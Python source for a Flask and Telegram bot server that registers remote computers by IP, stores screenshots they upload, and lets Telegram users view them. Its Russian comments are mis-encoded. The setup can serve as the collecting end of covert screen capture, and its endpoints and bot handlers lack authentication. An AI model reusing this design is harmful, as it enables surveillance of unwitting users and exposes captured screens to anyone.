import requests
import telebot
import time
import os
import json
from flask import Flask, request, jsonify
from threading import Thread
from telebot import types
from commands import register_commands
from ping3 import ping
from werkzeug.utils import secure_filename

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Flask –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
app = Flask(__name__)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —Ñ–∞–π–ª–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
config_path = os.path.join(os.path.dirname(__file__), "files/botFiles/config.json")
if not os.path.exists(config_path):
    with open(config_path, "w") as f:
        json.dump({"token": "YOUR_API_TOKEN", "admin": "YOUR_ADMIN_ID"}, f)

computerlist_path = os.path.join(os.path.dirname(__file__), "files/botFiles/computer-list.txt")
if not os.path.exists(computerlist_path):
    with open(computerlist_path, "w") as f:
        f.write("")

def read_config():
    with open(config_path, 'r') as f:
        config = json.load(f)
    return config['token'], config['admin']

# –ß—Ç–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–∞ –∏ ID –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∏–∑ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
token, admin = read_config()
print(f"token: {token}\nadmin_chat: {admin}")

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ —Å —Ç–æ–∫–µ–Ω–æ–º
bot = telebot.TeleBot(token)

online_status = {}

def add_computer(ip):
    with open('files/botFiles/computer-list.txt', 'a') as f:
        f.write(ip + '\n')

def read_computer_list():
    if not os.path.exists('files/botFiles/computer-list.txt'):
        return []
    with open('files/botFiles/computer-list.txt', 'r') as f:
        return [line.strip() for line in f.readlines()]

def load_online_status():
    computers = read_computer_list()
    current_time = time.time()
    for ip in computers:
        online_status[ip] = current_time  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–µ–∫—É—â–µ–µ –≤—Ä–µ–º—è –∫–∞–∫ –ø–æ—Å–ª–µ–¥–Ω–µ–µ –≤—Ä–µ–º—è –ø–∏–Ω–≥–∞
    print(computers,"- computers")

def update_ping(ip):
    current_time = time.time()
    online_status[ip] = current_time  # –ó–∞–ø–æ–º–∏–Ω–∞–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –ø–∏–Ω–≥–∞
    if ip not in read_computer_list():
        add_computer(ip)
        print("new computer added: " + ip)

def check_online_status():
    current_time = time.time()
    online_computers = []
    for ip, last_ping in online_status.items():
        if current_time - last_ping <= 60:
            online_computers.append((ip, 'üü¢', last_ping))  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –ø–∏–Ω–≥–∞
        else:
            online_computers.append((ip, 'üî¥', last_ping))  # –û—Ñ—Ñ–ª–∞–π–Ω
    return online_computers

@bot.message_handler(commands=['ping'])
def get_online(message):
    online_computers = check_online_status()
    if not online_computers:
        bot.send_message(message.chat.id, "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤ –¥–ª—è –ø–∏–Ω–≥–∞.")
        return

    response = "–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø–∏–Ω–≥–∞:\n"
    markup = types.InlineKeyboardMarkup()  # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É

    for ip, status, last_ping in online_computers:
        button = types.InlineKeyboardButton(text=f"{ip} - {status}", callback_data=f"ping_{ip}")
        markup.add(button)

    bot.send_message(message.chat.id, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('ping_'))
def handle_ping(call):
    ip = call.data.split('_')[1]  # –ò–∑–≤–ª–µ–∫–∞–µ–º IP –∏–∑ callback_data
    response = f"–ü–∏–Ω–≥—É—é —Å–µ—Ä–≤–µ—Ä {ip}..."
    bot.send_message(call.message.chat.id, response)  # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ –ø–∏–Ω–≥–∞

    try:
        # –í—ã–ø–æ–ª–Ω—è–µ–º –ø–∏–Ω–≥
        ping_time = ping(ip)
        if ping_time is not False:
            response = f"–°–µ—Ä–≤–µ—Ä {ip} –ø–∏–Ω–≥–æ–≤–∞–Ω: {ping_time * 1000:.2f} –º—Å."
            update_ping(ip)  # –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –ø–∏–Ω–≥–∞
        else:
            response = f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–∏–Ω–≥–æ–≤–∞—Ç—å —Å–µ—Ä–≤–µ—Ä {ip}. –í–æ–∑–º–æ–∂–Ω–æ, –æ–Ω –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω."
    except Exception as e:
        response = f"–û—à–∏–±–∫–∞ –ø–∏–Ω–≥–∞ —Å–µ—Ä–≤–µ—Ä–∞ {ip}: {str(e)}"

    bot.answer_callback_query(call.id)  # –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ–º –Ω–∞–∂–∞—Ç–∏–µ –∫–Ω–æ–ø–∫–∏
    bot.send_message(call.message.chat.id, response)

    # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –¥–ª—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –ø–∏–Ω–≥–∞
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="–ü–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–∏–Ω–≥", callback_data=f"ping_{ip}")
    markup.add(button)
    bot.send_message(call.message.chat.id, "–ü–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–∏–Ω–≥?", reply_markup=markup)

@app.route('/screenshot', methods=['POST'])
def screenshot():
    # –ü–æ–ª—É—á–∞–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∏–∑ –∑–∞–ø—Ä–æ—Å–∞
    image = request.get_data()

    # –£–¥–∞–ª—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π —Ñ–∞–π–ª —Å —Ç–µ–º –∂–µ IP-–∞–¥—Ä–µ—Å–æ–º
    import os
    dir = 'files/get'
    for file in os.listdir(dir):
        if file.startswith(request.remote_addr + '-'):
            os.remove(os.path.join(dir, file))

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ –ø–∞–ø–∫—É files/get
    timestamp = time.strftime("%H-%M-%S")
    filename = f"{request.remote_addr}-{timestamp}.jpg"
    with open(f"files/get/{filename}", "wb") as f:
        f.write(image)

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
    return jsonify({"message": "–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–æ–ª—É—á–µ–Ω–æ!"})

@bot.message_handler(commands=['getscreenshot'])
def get_screencum(message):
    online_computers = check_online_status()
    if not online_computers:
        bot.send_message(message.chat.id, "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤ –¥–ª—è –ø–∏–Ω–≥–∞.")
        return
                                #COCA–õ?
    response = "–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ä–≤–µ—Ä:\n" #COCA–õ?
                                #COCA–õ?
    markup = types.InlineKeyboardMarkup()  # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É

    for ip, status, last_ping in online_computers:
        button = types.InlineKeyboardButton(text=f"{ip} - {status}", callback_data=f"screenshot_{ip}")
        markup.add(button)

    bot.send_message(message.chat.id, response, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('screenshot_'))
def handle_screenshot_request(call):
    ip = call.data.split('_')[1]  # –ü–æ–ª—É—á–∞–µ–º IP –∏–∑ callback_data
    dir_path = "files/get"  # –ü—É—Ç—å –∫ –ø–∞–ø–∫–µ —Å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è–º–∏

    # –ò—â–µ–º —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ IP
    matching_files = [f for f in os.listdir(dir_path) if f.startswith(ip)]

    if matching_files:
        # –ï—Å–ª–∏ –Ω–∞–π–¥–µ–Ω —Ö–æ—Ç—è –±—ã –æ–¥–∏–Ω —Ñ–∞–π–ª, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∞–º—ã–π –ø–æ—Å–ª–µ–¥–Ω–∏–π (–ø–æ –≤—Ä–µ–º–µ–Ω–∏)
        latest_file = max(matching_files, key=lambda f: os.path.getmtime(os.path.join(dir_path, f)))
        image_path = os.path.join(dir_path, latest_file)

        with open(image_path, 'rb') as photo:
            bot.send_photo(call.message.chat.id, photo)
    else:
        bot.send_message(call.message.chat.id, f"–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è —Å–µ—Ä–≤–µ—Ä–∞ {ip} –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")



@bot.message_handler(commands=['pingall'])
def ping_all(message):
    response = "–°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –ø–∏–Ω–≥–æ–≤–∞–Ω–Ω—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤:\n\n"
    current_time = time.time()

    for ip in online_status.keys():
        try:
            # Ping the server
            ping_time = ping(ip)

            # Determine status and milliseconds
            if ping_time is not None:
                status = 'üü¢'  # Server is online
                milliseconds = int(ping_time * 1000)  # Convert to milliseconds
                response += f"{ip} - {status} - {milliseconds} –º—Å\n"
            else:
                status = 'üî¥'  # Server is offline
                milliseconds = "–ù–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è"
                response += f"{ip} - {status} - {milliseconds}\n"

            # Update the online_status dictionary
            online_status[ip] = current_time if status == 'üü¢' else current_time

        except Exception as e:
            # Handle errors during ping
            status = 'üî¥'  # Mark as offline in case of error
            response += f"{ip} - {status} - –û—à–∏–±–∫–∞ –ø–∏–Ω–≥–∞: {str(e)}\n"
            online_status[ip] = current_time  # Update timestamp

    # Send the response to the user
    bot.send_message(message.chat.id, response)

@app.route('/', methods=['POST'])
def ping_route():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({"error": "IP address is required"}), 400
    try:
        update_ping(ip)  # –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–∏–Ω–≥–∞ –¥–ª—è –¥–∞–Ω–Ω–æ–≥–æ IP
        return jsonify({"message": f"Ping updated for {ip}"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/", methods=['DELETE'])
def stop():
    global bot
    bot.stop_polling()  # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –±–æ—Ç–∞
    print("BOT HAS STOPPED BY WEB OPTION")  # –õ–æ–≥–∏—Ä—É–µ–º –æ—Å—Ç–∞–Ω–æ–≤–∫—É –±–æ—Ç–∞
    response = jsonify({"message": "Bot stopped"})  # –°–æ–∑–¥–∞–µ–º JSON-–æ—Ç–≤–µ—Ç
    response.status_code = 200  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∞—Ç—É—Å –∫–æ–¥
    response.call_on_close(lambda: os._exit(0))  # –ó–∞–≤–µ—Ä—à–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç–≤–µ—Ç–∞
    return response  # –í–æ–∑–≤—Ä–∞—â–∞–µ–º –æ—Ç–≤–µ—Ç

if __name__ == "__main__":
    load_online_status()  # –ó–∞–≥—Ä—É–∂–∞–µ–º —Å—Ç–∞—Ç—É—Å –æ–Ω–ª–∞–π–Ω –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–≤
    register_commands(bot)

    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    bot_thread = Thread(target=bot.polling, daemon=True)
    bot_thread.start()
    try:
        ip = requests.get('https://api.ipify.org').text
        bot.send_message(admin, f"Bot is online. Server-IP: {ip}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to get server IP: {e}")

    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    app.run(host='0.0.0.0', port=5000)